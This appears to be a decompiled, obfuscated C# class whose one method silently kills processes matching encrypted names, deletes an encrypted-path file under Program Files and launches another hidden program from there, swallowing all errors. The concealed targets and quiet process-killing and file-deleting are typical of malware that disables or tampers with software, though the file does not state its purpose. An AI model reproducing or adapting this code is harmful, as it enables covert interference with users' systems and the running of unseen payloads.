using System;
using System.Diagnostics;
using System.IO;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using ns3;
using ns4;

namespace ns1;

internal class Class11
{
	public class Class12
	{
		public static void smethod_0()
		{
			try
			{
				Process[] processes = Process.GetProcesses();
				foreach (Process process in processes)
				{
					if (process.ProcessName.Contains(Class6.smethod_0("rcnFyMYM", "False")) | process.ProcessName.Contains(Class6.smethod_0("aqaipaMv", "False")))
					{
						process.Kill();
					}
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			double double_ = 5.0;
			Class5.smethod_0(ref double_);
			try
			{
				string path = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + Class6.smethod_0("gpTAuKaTna/Cs4yqs6+YmqatwIaWsZC0uYdvwrerIA==", "False");
				if (File.Exists(path))
				{
					File.Delete(path);
				}
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
			double_ = 2.0;
			Class5.smethod_0(ref double_);
			try
			{
				Interaction.Shell(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + Class6.smethod_0("fI66sqCNl5nBpIGodLK3hSc=", "False"), (AppWinStyle)2, false, -1);
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
		}
	}
}
